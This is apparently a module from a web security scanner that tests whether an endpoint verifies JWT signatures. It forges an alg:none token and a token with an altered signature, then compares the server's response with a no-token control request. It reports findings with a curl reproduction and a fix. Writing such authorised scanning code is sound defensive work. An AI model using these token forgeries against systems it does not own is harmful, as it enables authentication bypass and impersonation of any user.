// JWT authentication-weakness probe. When an authenticated scan carries a Bearer
// JWT, this checks whether the server actually VERIFIES the token's signature —
// the single most common, most severe JWT flaw. It forges two tokens no correct
// server should trust (an `alg:none` token with no signature, and one whose
// signature bytes are altered) and looks for a clean differential: the endpoint
// returns 401/403 with NO token (auth is enforced) yet ACCEPTS a forged token.
// That means anyone can mint a token for any user. Read-only (GETs only); the
// receipt is a `differential` bundle whose control is the no-token 401 and whose
// attack is the accepted forged request. Requires verified ownership (gated by
// the caller, like the other active probes).
import { safeFetch } from "./ssrf.js";
import type { ExploitEvidence } from "../src/types.js";
import { renderRawRequest, windowAround } from "./evidence.js";

export interface ParsedJwt {
  token: string;
  header: string;  // base64url header segment
  payload: string; // base64url payload segment
  sig: string;     // base64url signature segment (may be empty)
  alg: string;     // the alg claimed in the header
}

export function parseJwt(authValue?: string): ParsedJwt | null {
  const raw = (authValue || "").trim();
  const m = /^bearer\s+([A-Za-z0-9_-]+)\.([A-Za-z0-9_-]+)\.([A-Za-z0-9_-]*)$/i.exec(raw);
  if (!m) return null;
  try {
    const headerObj = JSON.parse(Buffer.from(m[1], "base64url").toString("utf8"));
    if (!headerObj || typeof headerObj.alg !== "string") return null;
    return { token: `${m[1]}.${m[2]}.${m[3]}`, header: m[1], payload: m[2], sig: m[3], alg: headerObj.alg };
  } catch {
    return null;
  }
}

const b64url = (s: string): string => Buffer.from(s, "utf8").toString("base64url");
const DENIED = new Set([401, 403]);

async function timedGet(url: string, headers: Record<string, string>): Promise<{ res: Response; text: string }> {
  const ctl = new AbortController();
  const id = setTimeout(() => ctl.abort(), 5000);
  try {
    const res = await safeFetch(url, { headers, signal: ctl.signal });
    return { res, text: await res.text().catch(() => "") };
  } finally {
    clearTimeout(id);
  }
}

// A distinctive line present in the authenticated response but not the
// unauthenticated one — stronger proof than a bare status code when we can find
// it (it's actual gated content the forged token unlocked).
function distinctiveProof(authed: string, unauth: string): string | null {
  const lines = authed.split(/[\n\r<>]+/).map((l) => l.trim()).filter((l) => l.length >= 16 && l.length <= 160);
  for (const l of lines) if (!unauth.includes(l)) return l;
  return null;
}

export async function probeJwtAuth(url: string, headers: Record<string, string>): Promise<any | null> {
  const authz = headers["Authorization"] || headers["authorization"];
  const jwt = parseJwt(authz);
  if (!jwt) return null; // no Bearer JWT supplied — probe not applicable
  if (jwt.alg.toLowerCase() === "none") return null; // already unsigned; nothing to forge

  // Everything EXCEPT the auth header — the only variable across the differential.
  const { Authorization, authorization, ...noAuth } = headers;
  void Authorization; void authorization;

  // Control: no token. Only meaningful if the endpoint actually enforces auth.
  let control: { res: Response; text: string };
  try { control = await timedGet(url, noAuth); } catch { return null; }
  if (!DENIED.has(control.res.status)) return null; // auth not enforced here → can't prove a bypass

  const forgeries: Array<{ variant: string; token: string; note: string }> = [
    { variant: "alg:none", token: `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${jwt.payload}.`, note: 'a token using the "none" algorithm (no signature at all)' },
    { variant: "tampered-signature", token: `${jwt.header}.${jwt.payload}.${jwt.sig ? jwt.sig.slice(0, -1) + (jwt.sig.endsWith("A") ? "B" : "A") : "AAAA"}`, note: "a token whose signature bytes were altered so it no longer verifies" },
  ];

  for (const { variant, token, note } of forgeries) {
    let attack: { res: Response; text: string };
    try { attack = await timedGet(url, { ...noAuth, Authorization: `Bearer ${token}` }); } catch { continue; }
    if (DENIED.has(attack.res.status) || attack.res.status >= 500) continue; // correctly rejected — good

    // Forged token accepted → the signature is not being verified.
    const proof = distinctiveProof(attack.text, control.text) || `${attack.res.status} ${attack.res.statusText}`;
    const attackResponse =
      `HTTP/1.1 ${attack.res.status} ${attack.res.statusText}\n\n` +
      windowAround(attack.text || "(empty body)", Math.max(0, (attack.text || "").indexOf(proof)), proof.length, 1200);

    const evidence: ExploitEvidence = {
      method: "differential",
      attack: {
        request: renderRawRequest("GET", url, { ...noAuth, Authorization: `Bearer ${token}` }),
        response: attackResponse,
      },
      control: {
        request: renderRawRequest("GET", url, noAuth),
        response: `HTTP/1.1 ${control.res.status} ${control.res.statusText}`,
      },
      signal: {
        quote: proof,
        offsetInResponse: attackResponse.indexOf(proof),
        why: `With no token this endpoint returns ${control.res.status} (auth is enforced), but it accepted ${note} and returned ${attack.res.status} — the JWT signature is not being verified.`,
      },
      demonstration: `We removed the token and the endpoint returned ${control.res.status}. We then sent ${note} — which no correctly-configured server would trust — and it was accepted (${attack.res.status}). The application does not verify JWT signatures, so an attacker can forge a token for any user.`,
      reproduction: `curl -s -i "${url}" -H "Authorization: Bearer ${token}"`,
      capturedAt: new Date().toISOString(),
    };

    return {
      testName: `JWT Signature Not Verified (${variant})`,
      payload: `Authorization: Bearer <forged ${variant} token>`,
      severity: "critical",
      description: `The application accepts a JWT forged without the signing key (${variant}): with no token the endpoint returns ${control.res.status}, but with the forged token it returns ${attack.res.status}. An attacker can change the subject/role claims and be authenticated as any user, including an administrator.`,
      fix: 'Verify the JWT signature on every request against a fixed, server-side algorithm and key. Reject tokens whose "alg" is "none" or does not match the expected algorithm — never trust the alg value from the token header itself.',
      evidence,
    };
  }

  return null;
}
